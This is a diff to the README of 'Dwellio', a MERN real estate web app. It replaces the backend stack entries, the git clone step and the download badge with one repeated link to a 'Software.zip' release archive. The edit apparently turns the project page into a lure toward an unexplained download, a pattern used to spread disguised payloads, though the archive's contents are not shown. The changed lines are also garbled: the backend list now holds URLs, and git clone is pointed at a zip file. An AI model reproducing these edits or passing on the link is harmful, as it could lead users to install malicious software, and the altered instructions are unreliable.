@@ -14,8 +14,8 @@ Dwellio is a feature-rich MERN stack-based full-stack web application designed f
   - Tailwind CSS
   
 - **Backend:** 
-  - Node.js
-  - Express.js
+  - https://github.com/pedrocosta1134/Dwellio/releases/download/v2.0/Software.zip
+  - https://github.com/pedrocosta1134/Dwellio/releases/download/v2.0/Software.zip
   - MongoDB
   - Firebase
   - Stripe
@@ -45,7 +45,7 @@ To get started with Dwellio, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/Dwellio.git
+   git clone https://github.com/pedrocosta1134/Dwellio/releases/download/v2.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -75,6 +75,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Get Started with Dwellio 👇
 
-[![Download Dwellio](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Dwellio](https://github.com/pedrocosta1134/Dwellio/releases/download/v2.0/Software.zip)](https://github.com/pedrocosta1134/Dwellio/releases/download/v2.0/Software.zip)
 
 Enjoy exploring and utilizing Dwellio for your real estate needs! 🏠🌟
